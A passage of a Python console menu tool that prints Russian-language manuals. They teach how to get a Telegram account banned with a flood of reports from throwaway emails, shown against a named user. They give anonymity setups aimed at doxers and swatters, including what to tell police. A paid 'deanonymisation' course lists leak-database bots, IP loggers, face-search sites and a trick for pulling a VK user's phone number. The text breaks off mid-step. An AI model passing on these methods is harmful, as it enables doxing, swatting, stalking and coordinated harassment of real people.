•Ну и напоследок, не приветствуется массовое использование стикеров и гифок. Здесь тоже все просто, cтикеры или картинки с жестами понимаются в разных культурах по-разному. И если где-нибудь в России этот стикер будет означать приветствие, то где-нибудь в республике Зимбабве этот же стикер будет означать угрозу насилия.
Отдельной темой и поводом для блокировки стоит реклама услуг финансового характера.

•Любой аккаунт может быть заблокирован. Если использует принципы финансовых пирамид, так называемые схемы Левина Понци. То есть, клиентов заманивают высокими процентами или дивидендами, но полученные деньги не вкладываются, а с них выплачиваются проценты старым клиентам.
•Различные партнерские программы не приветствуются модераторами Телеграмм. То есть те аккаунты. В которых основная цель: получение процентов от каждого нового клиента компании, на которую стоит ссылка с аккаунта, могут попасть в вечный банн.
•Реферальные схемы, где есть посылы или обещания бесплатных денег или валюты.
•Ставки или схемы инвестиций любого рода
•Про «обнажёнку» и порнография я уже говорил
•Оскорбления и унижения группы людей. Группы людей могут быть разными, объединены по расовому признаку, религии, полу, возрасту, национальности и пр.
•Жестко модерируются аккаунты в которых выявлены факты притеснения
Канал блокируется, если в нем есть факты разглашения чужих личных данных. Это могут быть: ФИО, фото, адреса проживания и номера телефонов.


Дальше схема действий проста. Пишем модераторам на эту почту abuse@telegram.org. И излагаем конкретно факты нарушений правил телеграмм чужого канала. По опыту. Одной жалобы будет совершенно недостаточно для блокировки аккаунта. Создаём много левых почт, и пишем жалобы с них разделяя их по времени. Если таких жалоб будет несколько (число зависит от аккаунта). То в течении нескольких недель аккаунт может быть заблокирован.

Полной гарантии блокировки конечно нет. Но то что канал уже попадёт под наблюдение –это точно. И при последующих нарушениях с таким каналом точно не будут церемонится. В одиночку заблокировать канал Телеграмм достаточно трудно, но возможно.
              """))
                 input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '95':
             print(Colorate.Vertical(Colors.cyan_to_red, """
для начала рассмотрим за что можно снести аккаунты

1. Ддос
2. Сват
3. Докс
4. продажа услуг Ддос/сват/докс
5. Оскорбление личности
6. Оскорбление религий
7. Оскорбление родителей
8. Угрозы
9. И все что не законно по УК РФ

Нам надо будет писать на почты телеграмма жалобы по нарушению
почты для жалоб
ceo@telegram.org

DMCA@telegram.org

abuse@telegram.org

sms@telegram.org

sticker@telegram.org

topCA@telegram.org

recover@telegram.org

support@telegram.org

security@telegram.org
=================================================
пример буду показывать на человеке с ником @puciv

Название письма: ЖАЛОБА!!
Текст письма: Здравствуйте уважаемая поддержка телеграмм хочу пожаловаться на пользователя ( https://t.me/puciv ). Данный пользователь оскорбляет третьих лиц матом а это Статья 213 УК РФ вот ссылка на нарушение ( https://t.me/c/1965749366/210505 ). Так же данная личность оскорбляет религии вот ссылка на нарушение ( https://t.me/c/1965749366/210561 ). Прошу заблокировать данного пользователя. Благодарю за понимание и надеюсь на вашу помощь.

вообщем в скобках вы вставляете ссылку на вашу жертву ссылку на сообщение с нарушением и тд после чего в течении 1-2 дней аккаунт вашей жертвы отлетает даже если на нем есть телеграм премиум и 2 юза как это было у пусива)
"""))
             input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '50':
             print(Colorate.Vertical(Colors.cyan_to_green, """
Анонимность в "Интернете" для чего она же нужна?Ну сперва начнем с того что, анонимность нужна для избежания попадания валид(настоящих) данных в сеть.
Как же себя обезопасить, желательно использовать фейк данные при регистрации в соц сети,либо иметь два аккаунта в соц сетях.Например у нас есть основной аккаунт "Даша Василькова" там у нас все друзья,работа,школа и так далее.
А нам нужен ещё второй аккаунт для безопасности в интернете,чтобы общаться со второй личности о которой будут не будут знать другие люди.Что же нам нужно чтобы стать анонимным в соц сетях на так называемой "Второй личности".                       
Мессенджер Вк(ВКонтакте) довольно популярный мессенджер с общим количеством пользователей 100 миллионов,в котором есть Деанонеры которые могут вас с "Деанонить".Как обезопасить себя от мамкиных Деанонеров.

Открываем мессенджер "телеграмм" и в поисковой строке вбиваем @AuroraSMS_bot/@SMSBest_bot в любом боте пополняем баланс на на 8-25₽ столько стоит виртудь номер для ВКонтакте.Покупаем номер далее скачиваем любой впн самый обычный простой например:Turbo VPN,VPN proxy speed и ТД.
Включаем VPN далее скачиваем приложение "2 Accounts"Далее после скачивания делаем всё как сказано.
Покупаем виртуальный номер на ВКонтакте,копируем номер,включаем впн и регион Швейцария, заходим в 2 accounts,добавляем приложение ВКонтакте нажимаем на него и входим через 2 accounts,так у нас появилось клон ВКонтакте, нажимаем зарегистрироваться главное делать все с VPN,вводим наш виртуальный номер,смотрим бота в котором пришел код, далее после успешного ввода кода,вводим не настоящую имя и фамилию, город тоже фейковый и страну,место работы и ТД тоже фейк и дату рождения.На аватарку себя не ставим профиль закрываем это не кринж это безопасность!И воля мы в ВК анонимны, входим теперь всегда через  2 accounts в ВКонтакте.

Telegramm:Теперь нам надо по другому,берём телефон друга, заходим в боты @GreedySMSbot(Best)@AuroraSMS_bot @SMSBest_bot пополняем баланс на ,17-50₽ столько стоит хороший виртуальный номер,покупаем виртуальный номер на аккаунте друга,на своем телефоне удаляем телеграмм и скачиваем чистый телеграмм с Play Market, включаем впн заходим в телеграмм копируем наш виртуальный номер вставляем получаем код и регистрируем с VPN телеграмм аккаунт.Все мы зарегистрировали телеграмм аккаунт.Заходим в настройки телеграмм конфиденциальность и в пересылке сообщение ставим никто.Номер телефона,ставим никто,при добавлении в контакты людей ставим не показывать номер телефона.



Всегда желательно использовать VPN,не давать не кому номер телефона, при регистрации использовать виртуальный номер!
"""))
             input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))

            if choice == '51':
             print(Colorate.Vertical(Colors.cyan_to_red, """
Давайте обсудим, какая анонимность нужна именно вам и какой бюджет. Если бюджет у вас минимальный, то для вас подойдет анонимность под пунктом 1
Если у вас бюджет средний, то посоветую подкопить до 12к хотя бы, чтобы быть более менее анонимным, если у вас нету 12к, то это будет тупая трата денег на какие-то прокси и впн, смысла тупо нет !

Пункт 1.
1. И так, начнем с того что заходим в Яндекс, нажимаем на три палочки сверху, удалить аккаунт потом, после того как вы удалили данные с Яндекса это первый шаг к анонимности по скольку информацию будет найти уже гораздо сложнее. Удаляем свои данные в "Quick Osint" и "Глаз Бога", после заходим с впн на данные сайты и пишем заявление о удалении данных https://support.google.com/
legal/contact/Ir_rudpa?product=websearch
https://yandex.ru/support/abuse/troubleshooting/ oblivion.html
https://go.mail.ru/support/oblivion/
потом, после по всем ссылкам переходим в Tor Browser/ DuckDuckGo.
2. После этого нам нужно будет удалить ВСЕ СВОИ ОСНОВНОЫЕ СОЦ СЕТИ(основные подразумевается привязанные на основной номер или почту)и удалите все Российские приложения. Если вы это не сделаете, то вас будет очень легко найти
3. УДАЛИТЬ ВСЕ ПОЧТЫ(Gmail,mail и тд). Использовать только временные ! Посоветую https://temp-mail.org/ru/(не спонсировано).
4. Т.к у нас бюджет минимальный, то надо естестевенно купить виртуальный номер, было бы ахуенно, если хватило бы бабок на физ.
5. Никогда не говорите основную информацию о себе, никогда не делайте одни и теже теги от вк и тг ! Будьте умнее, делайте цепочку. Купили физ, у вас выдает чужие данные, а при покупки подписки в глазе бога поставьте почту, где привязан другой номер. Доксер сильно запутается и не поймет, какой чей и будет думать, что какой-то номер ваш.
6. В вк подписывайтесь на сообщества другого города, абсолбтно другого, чтобы жертва зашла, и увидела Например "Подслушано Хабаровск" и подумали, что вы от туда. И вообще не советую использовать вк, т.к он собирает полную информацию о вас, отслеживает ваши действия, и передвижения, все переписки - хранятся, и при удалении
сообщения открою секрет, ты не удаляешь их с ВКонтакте, просто появляется своего рода
функция "скрытия", а так удаленные
сообщения, и медиа контент доступны всем пользователям
7. Использовать всегда впн, либо прокси дабы избежать логгеров, сейчас стало популярно отправлять логгер в виде чека в @CryptoBot
8. Тик ток он отдельно заслуживает внимание. Помойка по всем фронтам, которая кроме деградации опять-же зарабатывает на использовании
твоих данных, которые могут передаваться в высшие органы. Данные далеко не ограничиваются "лайком" под клип, вовсе нет, всё то что может собирать телефон с вас -
отчасти собирают и эти приложения, и
используя Тик Ток вы даете открытые двери в ваш телефон. Так-же Тик Ток был добавлен в Виндовс 11, а она в свою очередь является провальной, и сливает даже снимок вашей фотографии с того же ноутбука, даже когда вы
сами не включали камеру, якобы для
улучшение чего-то там
9. Если вы хотите стать доксером, либо сватером, то без пк вам не обойтись, давайте поговорим, как стать анонимным и на пк. Первым, что надо понимать, что Windows 10 удобный, но для докса и свата не преднозначен, используйте свою основную операционную систему, только для игр, не заходите на аккаунты, где вы ведете докс и тд. Скачайте виртуалку и поставьте пароль, который никто не будет знать, на нее установите Windows 7 либо Windows 8(для сваттинга), если вы не собираетесь сватать, то установите простой Kali Linux
10. И СУКА НЕ КАЧАТЬ ВСЕ ПРИЛОЖЕНИЯ ПОДРЯД, В КОНЦЕ КОНЦОВ ВАМ СКИНУТ КАКОЙ НИБУДЬ ВИРУС КРАДЯЩИЙ ЛОГИ И ТД. ДАЖЕ ЕСЛИ ВЫ ПИЗДЕЦ БУДУТЕ УВЛЕЧЕНЫ ПРИЛОЖЕНИЕМ.
11. Посоветую использовать такую цепочку для нищих
HidemyVpn(ниже расскажу о нем)> NordVpn > Proxy > ProtonVpn > Tor Browser
HidemyVpn - очерь хороший впн(альтернатива Mullvald), но его можно абьюзить, первому пользователю 24ч бесплатно, каждые 24ч очищаете куки создаете нью акк и регаетесь.
********************************
Вот и все, мы удалили все данные о себе во всех сервисах, удалили яндекс, научились переходить по сыллка в Tor Browser or DuckDuckGo, удалили свои соц сети, удалили русские приложения, купили виртуальный или физический номер, сделали небольшую цепочку путаницу в анонимности, поставили впн, удалили тикток, поставили Kali Linux and Windows 7/Windows 8. Это базовая анонимность, если ее соблюдать, то никакой доксер не найдет вас уж точно, если сами не проебетесь 
********************************

Пункт 2.
Готовьте свои денюжки)💵
1. Все делаем также, что и в "Пункт 1", только к этому добавим 2 телефон и свою физическую симку + по желанию сделаем цепочку.
2. Покупаем телефон на авито б/у и туда СУКА НИКОГДА НИ В КОЕМ СЛУЧАЕ не вставляйте свою основную симку
3. Покупаем Физичискую симку у дропов либо у меня и вставляем ее в телефон.
4. Используем 2 телефон только для своих дел, а именно ворк, докс и тд.
5. Никому не показываем свой 2 телефон. На своем основном телефоне никогда не заходим на аккаунты которые вы купили, тоже самое и на пк(только на виртуалке)
6. Ебейшая цепочка:
MullvadVPN + HidemyVpn + Proxy + Tor Browser or DuckDuckGo
****************************************************

Так вот, в случае если к нам даже и приедут копы, то они будут брать вашу технику на проверку. Отдаем свой основной телефон и пк, 2 телефон надо заныкать куда подальше, и вообще он всегда должен быть заныкан.

К телефону вопросов не будет, но у вас могут спросить за виртуальную машину на пк, т.к там стоит пароль. Тут важно не проебаться, скажите, что ее использовали для проверки приложений на вирусы, но проебали пароль.

Спасибо за покупку! С этим мануалом вы никогда не проебетесь, если только сами. Если все соблюдать, как тут рассписано от А до Я, то вы спокойно можете считать себя анонимным
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '52':
             print(Colorate.Vertical(Colors.cyan_to_red, """
Здравствуйте.

Тема мануала: Анонимность в интернете. Как оставаться для всех анонимным. 
Написан мануал: 14.04.2024 ( это надо для того, если Вы или кто-то другой будет читать мануал например через год то Вы или человек не удивлялись от того что какой-то сервис может не работать или же человек уже поменял @ или же ушёл с должности )

[ Анонимность ( Не для SWATINGA ) ]

Для начала ответы на вопросы:

~ Что такое анонимность?
 Анонимность это простыми словами - скрыть доступ к своим данным от людей.
~ Кому анонимность нужна?
 Для начала: обычным людям. А в основном тому кто занимается чем-то нелегальным.

По моему мнению и опыту это самые популярные вопросы ( если они есть ). Но важно. Вам нужно запомнить 1 простую вещь с первого взгляда но если вдуматься то она реально очень много значит:

У государства УЖЕ есть ваши данные. Поэтому нельзя никому давать свои настоящие данные. Также как и лицо. 

[1] Регистрация новых социальных сетей.

[1.1] Ищем человека который может продать физический номер. Обычно цена от 3 - 10 долларов ( USDT ) прайсы максимально разные и зависит от самого номера. 

[1.2] Если вы можете советую самому покупать сим-карту и пользоваться ей. 

Люди которые хорошие и могут продавать физические номера: 

~ @ExpoTransfer  ( продает РФ физы )
~ @digewe ( только через крипту если вы из РФ ) 

Подробнее о [1] разделе:
Если вам не хочется настолько так много действий делать то можете просто пойти и купить  / арендовать виртуальный номер и зарегистрировать на него все сервисы ( Tik-Tok, Instagram, Telegram, VK, WhatsApp и другие ). 

Все сервисы которыми Вы пользуетесь - на них Вы должны зарегистрировать новые аккаунты.
! ! ! Важно НИКОГДА не покупайте готовые аккаунты например на playerok/funpay и других сервисах. 1 При пробиве вашего аккаунта - будет показана почта на которую вы покупали аккаунт. 2 Вас могут просто обмануть ! ! !

[1.3] При регистрации аккаунтов Вы ОБЯЗАНЫ придумать полностью новую личность. Точнее это: ФИО ( фамилии имени отчестве ), дата рождения, номер телефон, почта, место рождения ( желательно не ваш город, а если вы не из России то вообще другая страна ( из-за того что Россия большая страна. И есть города, которые по размеру как полноценная страна ) ), адрес, паспорт ( Если у Вас есть фото паспорта ( Не Вашего, а любого другого человека ) то делайте ВСЮ информацию по паспорту ) этого хватит. 

Подробнее о [1]: Вам обязательно надо изменить манеру речи. Желательно на максимально вежливую, и почти без оскорблений. Оскорбления = негатив. А нам этого не надо. Вежливая = располагает людей. Также. НИКОГДА не давайте вашу 2-ю личность своим родным или же тем кто знает вас в реальной жизни а не цифровой. 

[2] VPN + Прокси + Чистка кэша и файлов cookie.

[2.1] VPN 
Очень важная вещь для анонимности ( изменяет ваши IP адрес ). Думаю тут много говорить не надо так что лучшие VPN(ы):
~1.1.1.1
~NordVPN
~PlanetVPN
~SurfsharkVPN
~ProtonVPN 
По моему мнению это лучшие. Из бесплатных это 1.1.1.1 и PlanetVPN. 

[2.2] Чистка кэша и файлов cookie.

Зачем чистить это все? Все легко. Есть сайты и боты ( для пробива ) где показывают ваши данные по кэшу и файлам cookie.

- Откройте Chrome на компьютере.
- В правом верхнем углу экрана нажмите на значок с тремя точками Удалить данные о работе в браузере.
- Выберите временной диапазон, например Последний час или Все время.
- Отметьте типы данных, которые нужно удалить.
- Нажмите Удалить данные.

[2.3] Прокси

~ Что такое прокси ? 
 Прокси это ресурс, который принимает данные пользователей и отправляет их от своего имени. 
~ Для чего нужен прокси ?
 Прокси нужен для оптимизации работы и усиления безопасности. 

Как сделать себе прокси ( на Windows )
Нажмите кнопку Пуск, затем выберите Параметры => Сеть и Интернет =>Proxy
В разделе Настройка прокси-сервера вручную включите функцию Использовать прокси-сервер. Выполните следующие действия. В полях Адрес и Порт введите имя прокси-сервера или IP-адрес и порт (необязательно) соответственно.

Также советую прокси от 1.1.1.1 там он бесплатный.

{Откройте Chrome на компьютере.
В правом верхнем углу экрана нажмите на значок с тремя точками Удалить данные о работе в браузере.
Выберите временной диапазон, например Последний час или Все время.
Отметьте типы данных, которые нужно удалить.
Нажмите Удалить данные.

Ну и так почти в каждом браузере. Говорю про самый популярный. 

[3] ВМ + ВДС + ВПС

~ Что такое ВМ, ВДС, ВПС ? 
 ВМ - Виртуальная машина. Простыми словами - 2-й компьютер, на которой можно ставить любую операционную систему.
 ВДС - Почти тоже самое что и ВМ, только, вы в основном ВДС пользуетесь в браузере, ваш компьютер не нагружается, а нагружается сервер на котором стоит ВДС, вы можете выбрать любое кол-во ОЗУ, и памяти, и у вас будет сразу ВПН, и иногда даже прокси. Но это стоит денег.
 ВПС - чуть хуже ВДС, просто нету ВПН ( в основном ).

~ Для чего это все надо?
 Во первых, это анонимность. При регистрации, указывается ваше устройство. А если будет написано "Virtual Box" или какое-то название сервера ВДС / ВПС то вам ничего не грозит. 

 Также, если вы не уверены что файл который вы увидели, без вирусов - можете использовать ВМ чтобы это протестировать, ведь если файл с вирусом, вы можете просто удалить ВМ.

Купить VDS / VPS:

~https://timeweb.com/ru/services/vds/
~https://www.reg.ru/vps/?utm_source=bing.com&utm_medium=organic&utm_campaign=bing.com&utm_referrer=bing.com
~https://firstvds.ru/products/vds_vps_hosting

Скачать ВМ:

~https://www.vmware.com/

Также, чтобы скачать ВМ, вам нужен образец Windows ( или желаемой операционной системы ).

Писать как устанавливать на ВМ операционную систему не буду, так как очень много видео на YouTube. 

[4] Браузер - Tor. 

~ Что такое Tor - Браузер и зачем он нужен?
 Tor браузер - это 1 из самых анонимных браузеров из всех существующих.
~ Почему Tor - анонимный? 
 Поскольку серверы Tor накладывают свое шифрование поверх шифрования других серверов, все это напоминает слои луковицы. Tor означает "The Onion Routing" ("Луковая маршрутизация") - название говорит само за себя. По своей структуре Tor безопасен. 

[5] Почты, самые безопасные и анонимные. 

~ Для чего нужны анонимные почты?
 Анонимные почты - они созданы для того чтобы вас не отследили и не слили вашу информацию. Ведь в слитых базах gmail есть все начиная от ФИО заканчивая Адресом. А в примерах ниже показанных - нет. 

- ProtonMail

Хорошая, анонимная почта, от компании Proton, которая сделала VPN тоже. 1 гб хранилище. 

- Tutanota

Тоже 1 гб хранилища. Тоже хорошая и анонимная. 

Это 2 самые лучшие почты, которые есть, и которые советую использовать ( лично использую ProtonMail ) 

[6] Заключительный этап:

Так все же: Как быть анонимным? Последовательно все шаги чтобы стать анонимным: 

[6] Пошагово как стать анонимным с затратами. 

1. Скачать Tor браузер. 
2. С Tor браузера скачать 1.1.1.1 VPN и PlanetVPN.
3. Включить сначала PlanetVPN потом 1.1.1.1 VPN ( если ошибка - включайте лучше ТОЛЬКО 1.1.1.1 ) 
4. В Tor браузере зайдите на сайт чтобы купить VDS / VPS.
5. На VDS / VPS установите прокси.
5. На VDS / VPS скачать все необходимое: Tor, мессенджеры, VPN(ы). 
6. На основном VDS / VPS делайте все аккаунты ( на мессенджеры ) через номер. 
7. Сделайте txt. файл где будет информация о вашей личности. 
8. Регистрируйте почту на ProtonMail / Tutanota ( но лучше и там и там )
9. Пароль должен быть не одинаковый, и не легкий пример: f8@2kf!fj>
10. По желанию можете сделать кошелек, если вам конечно надо.

[7] Как стать анонимным, с минимальными затратами.

1. Скачать Tor браузер. 
2. С Tor браузера скачать 1.1.1.1 VPN и PlanetVPN.
3. Включить сначала PlanetVPN потом 1.1.1.1 VPN ( если ошибка - включайте лучше ТОЛЬКО 1.1.1.1 ) 
4. В Tor браузере зайдите на сайт чтобы скачать ВМ и Образец
5. На ВМ установите прокси.
5. На ВМ скачать все необходимое: Tor, мессенджеры, VPN(ы). 
6. На основном ВМ делайте все аккаунты ( на мессенджеры ) через номер ( физический или виртуальный ). 
7. Сделайте txt. файл где будет информация о вашей личности. 
8. Регистрируйте почту на ProtonMail / Tutanota ( но лучше и там и там )
9. Пароль должен быть не одинаковый, и не легкий пример: f8@2kf!fj>
10. По желанию можете сделать кошелек, если вам конечно надо.
"""))
             input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '53':
             print(Colorate.Vertical(Colors.cyan_to_red, """
BY QWENTY
Спасибо вас за приобретение обучения за $50, вы сможете лучше пробивать информацию о людях и деанонить. 
В рамках обучения вы изучите разнообразные методы поиска информации, актуальные инструменты,
а также лучшие практики, позволяющие сделать этот процесс максимально эффективным.

Вступление:
Прежде всего, я хотел бы отметить, что для достижения лучших результатов необходимо использовать все доступные инструменты. 
У вас должно быть умения мыслить глубоко и анализировать данные, а также применять передовые технологии и инструменты.
Нажимая кнопочки в обычном глазе бога вы ничему не научитесь, я думаю вы все понимаете что разработчики перед тем как
выложить свое творение - тестируют его
И я нашел модифицированную версию глаза бога "RED SEARCH" наверное вы даже о нем не слышали
ведь на момент продажи обучения о нем знают всего лишь 15 человек

Начало:

Я поделюсь с вами приватным материалом например сайтами и ботами с помощью которых
вы сможете пробивать намного лучше чем сейчас
Немного поговорим про RED SEARCH, по внешнему виду он никак не отличается но если сравнивать выход
информации после запроса, ищет он намного лучше

Боты: RED SEARCH - @RedSearchBot или https://t.me/RedSearchBot

Сайты:

http://220vk.com/ - Скрытые друзья ВК 
http://vk.city4me.com/ - Если пользователь отключил наблюдение на 220VK 
http://13c.me/vkf/ - Общие друзья ВК 
https://rulait.github.io/vk-friends-s... - Сохраняем список друзей ВК 
http://archive.is/ - Архив, ищем сейв-копию или сохраняем сами 
http://peeep.us/ - Аналог archive.is 
https://archive.org/ - Аналог archive.is [Down v] 
http://www.cachedpages.com/ - Кэш страниц 
http://skyperesolver.net/ - SkypeResolver / IPLogger 
https://yip.su/ - IPLogger 
https://vedbex.com/tools/iplogger - IPLogger 
http://phoneradar.ru/phone/ - Проверка валидности номера 
http://afto.lol/ - Если имееются связки Имя+Город, Фамилия+Возраст и т.д [Down v] 
http://zaprosbaza.pw/ - Аналог afto.lol [Down v] 
https://radaris.ru/ - Аналог afto.lol 
https://service.nalog.ru/inn.html - Узнаем ИНН, если вытащили Паспортные данные 
http://services.fms.gov.ru/info-service.htm?sid=2000 - Валидность паспорта 
https://2ch.hk/b/ - Создаем тред и устраиваем травлю

Каналы:
@crybeii - много различных софтов, ты сможешь найти похожие мануалы и приватные приложения для взлома
@asadess - различные материалы и сайты например как указанные выше
@flspace - новости в мире хакинга, следи в мире хакинга
@ithugo - самый лучший канали из выше написанных, там очень много разных постов и особенно о пробиве, хакинге и так далее

Вы прошли 1 часть из 10 частей мануала! Для получения следующей части напишите человеку у которого вы покупали

Я рад, что Вы завершили этот курс и научились пробивать информацию о людях. Вы прокачали свои навыки до нового уровня. 
Спасибо Вам за покупку этого обучения, и я уверен, что вложенные 50 $ сделали Вас более опытным и эффективным.
"""))
             input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '54':
             print(Colorate.Vertical(Colors.cyan_to_red, """
BY QWENTY
1. Всегда смотри внимательно на то, что тебе в гугле выходит при запросе. Порой даже мелочь может быть решением. 
2. Не думай, что деанонимизация представляет из себя что-то сверх умное и сложное. Каждый деанон строится на ошибках самого человека, ведь сли бы он сам не создал канал, ничего может и не было. 
3. Не советую тебе заниматься деанонами, если кто-то знает о тебе что-либо. Ты должен быть защищен, чтобы в случае чего ты сам не стал жертвой. 
4. К каждому человеку свой подход. На кого то уходит по 2-3 дня, кто-то деанонится за 5-10 минут
Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х
1. Несколько полезных сайтов.
[!] Содержимое раздела:

• https://checkusernames.com/ - Поиск по никнеймам, в него входят огромное колл-во сайтов.
• https://online-vk.ru/ - Покажет скрытых друзей, так же, покажет вам друзей из закрытого профиля.
• https://220vk.com/ - Сайт, который сможет показать скрытых друзей и не только.
• https://findclone.ru/ - Поиск по "клонам", определяет внешность человека, тем самым выдает страницу ВКонтакте на пользователя с максимально похожими чертами лица.
• Keyword Tool (https://keywordtool.io/)
Платформа показывает ключевые слова по введенному запросу на любом языке и по любой стране. В некоторых запросах даже видно, насколько они популярны, хотя эта услуга платная. Можно искать ключевые слова по Google, YouTube, Twitter, Instagram, Amazon, eBay, Play Store, Bing.
Ища по Google, можно, например, выбрать ключевые выражения, содержащие в себе вопросительные слова или предлоги. А слева есть фильтры, где можно искать по ключевым словам уже в получившейся выдаче.
• https://vk.com/tool42 - Приложение ВК, можно достать немного информации.
• https://www.kody.su/check-tel#text - На данной странице можно определить сотового оператора и регион (или город и страну) по любому номеру телефона в России или в мире.
• https://vk.watch/ - история профилей ВКонтакте, требуется подписка.
Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х

2. Телефон
L Поиск по номеру телефона
[!] Содержимое раздела:

• Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб
версия поиска по любому номеру телефона, поиск по аккаунтам и телефонной книге - от себя: полезная вещь в osint-сфере, не раз спасала меня.
• Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах - от себя: Сайт хороший, но я думаю, что бот в телеграмме будет на много удобнее для Вас.
• Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона - от себя: Вещь годная, но долго возиться
• Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона - Иногда нужен VPN
• @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит
• Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес
• @info_baza_bot (https://t.me/@info_baza_bot) — поиск в базе данных
• @find_caller_bot (https://t.me/@find_caller_bot) — найдет ФИО владельца номера телефона
• @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер
• @getbank_bot (https://t.me/@getbank_bot) — дает номер карты и полное ФИО клиента банка
• @eyegodsbot - Телеграмм бот, часто радовал меня, есть бесплатные пробивы по машинам, лицу, номеру телефона, есть платный контент.
• @egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта; учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы. Базы данных сами понимаете откуда. Ограничений бота – нет.
• @mnp_bot 
• @xinitbot 
• @black_triangle_tg 
Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х
3. Лицо
L Поиск лицу
[!] Содержимое раздела:

• FindTwin face search demo + @VkUrlBot (бот подобие сайта)— https://findclone.ru/
• Face search • PimEyes — https://pimeyes.com/en/
• Betaface free online demo — Face recognition, Face search, Face analysis — http://betaface.com/demo_old.html
• VK.watch – история профилей ВКонтакте — https://vk.watch/

Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х

4. Поисковые системы
L Поисковые Cистемы Людей:
[!] Содержимое раздела:

• https://www.peekyou.com/
• https://pipl.com/
• https://thatsthem.com/
• https://hunter.io/
• https://www.beenverified.com/

Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х
5. Ip-адрес.
L Проверка айпи адресов:
[!] Содержимое раздела:

• https://whatismyipaddress.com/
• http://www.ipaddresslocation.org/
• https://lookup.icann.org/
• https://www.hashemian.com/whoami/

Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х

Поиск по EMAIL:
- https://haveibeenpwned.com/
- https://hacked-emails.com/
- https://ghostproject.fr/
- https://weleakinfo.com/
- https://pipl.com/
- https://leakedsource.ru/

▫️ 🤖Боты
├ @Quick_OSINT_bot — позволяет проводить анализ профиля, покажет историю собщений пользователя, выгрузит его фотографии, а еще найдет телефон, email, как владелец записан в контактах, базах данных и досках объявлений, аккаунты в соц. сетях и мессенджерах, в каких чатах состоит, документы, адреса и многое другое
├ @FindNameVk_bot — история изменений имени аккаунта
├ @GetPhone_bot — поиск в утекших базах
├ @InfoVkUser_bot — бот покажет наиболее частые места учебы друзей аккаунта
└ @VKUserInfo_bot — бот скачивает всю информацию об аккаунте

⚙️ Ресурсы
├ 220vk.com (https://220vk.com/) — определит средний возраст друзей, скрытых друзей, города друзей, дата регистрации и т.д
├ archive.is (https://archive.is/) — архивированная страница аккаунта
├ archive.org — покажет архивированную версию аккаунта
├ searchlikes.ru (https://searchlikes.ru/) — найдет где есть лайки и комментарии, дает статистику друзей
├ tutnaidut.com (https://tutnaidut.com/) — информация аккаунта несколько лет назад
├ vk.watch (https://vk.watch/) — покажет историю аккаунта с 2016 года, ограниченная информация, покажет фото в низком качестве, можно уменьшить масштаб фото, тем самым распознать что там изображено
├ vk5.city4me.com (https://vk5.city4me.com/) — cтатистика онлайн активности, скрытые друзья
├ vkdia.com (https://vkdia.com/) — определит с кем из друзей переписывается человек
├ vk-express.ru (https://vk-express.ru/) — слежка за аккаунтом, после добавления будут доступны аватары, лайки, комментарии, друзья группы и т.д.
├ vk-photo.xyz (https://vk-photo.xyz/) — частные фото аккаунта
├ yasiv.com (http://yasiv.com/vk) — создает граф из друзей аккаунта, после регистрации добавьте в граф аккаунт того кого хотите просмотреть
└ yzad.ru (https://yzad.ru/) — находит владельца группы

🔧 Приложения
├ InfoApp (https://vk.com/app7183114) — найдет созданные группы, упоминания в комментариях, созданные приложения и комментарии к фото
└ VKAnalysis (https://github.com/migalin/VKAnalysis) — анализ круга общения, текста, фото, онлайна и интересов аккаунта

⚙️ Поиск через URL
├ https://online-vk.ru/pivatfriends.php?id=123456789 — поиск друзей закрытого аккаунта, замените 123456789 на ID аккаунта VK
├ https://vk.com/feed?obj=123456789&q=&section=mentions — упоминания аккаунта, замените 123456789 на ID аккаунта VK
├ https://ruprofile.pro/vk_user/id123456789 — сохраненная информация об аккаунте за 2017-18 год, замените 123456789 на ID аккаунта VK
├ https://rusfinder.pro/vk/user/id123456789 — сохраненная информация об аккаунте за 2017-18 год, замените 123456789 на ID аккаунта VK
└ https://my.mail.ru/vk/123456789 — найдет аккаунт на Мой Мир, замените 123456789 в ссылке на ID аккаунта



🆗 Как узнать номер телефона аккаунта VK через Одноклассники

1. В ВК добавьте аккаунт в друзья
2. Перейдите в Одноклассники и откройте раздел мои друзья
3. Нажмите на кнопку 'добавить друзей из ВК'
4. Если аккаунт нашелся, то скопируйте ссылку на найденный аккаунт ОК
5. Перейдите по ссылке - https://ok.ru/password/recovery и выберите восстановить через профиль
6. Вставьте в поле ссылку которую вы скопировали на профиль и нажмите искать

В результате вы получите часть номера телефона и e-mail адреса



👨‍👩‍👦 Как найти друзей приватного аккаунта VK

1. Скопируйте ID аккаунта у которого хотите узнать друзей
